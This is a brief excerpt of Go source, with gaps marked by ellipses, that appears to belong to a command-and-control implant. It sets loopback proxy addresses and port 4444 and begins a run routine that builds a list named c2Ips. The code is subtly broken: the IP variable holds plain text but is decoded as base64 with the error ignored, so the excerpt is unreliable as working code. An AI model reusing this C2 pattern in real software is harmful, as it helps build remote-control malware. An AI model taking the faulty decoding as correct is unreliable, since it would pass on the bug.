...
var ENCODED_PROXY_IPS = "127.0.0.1,127.0.1.1"
var ENCODED_PROXY_PORTS = "4444"
...
func (p *program) run() {
	r, _ := base64.StdEncoding.DecodeString(ENCODED_PROXY_IPS)
	c2Ips := strings.Split(string(r), ",")
	stringyPorts := strings.Split(ENCODED_PROXY_PORTS, ",")
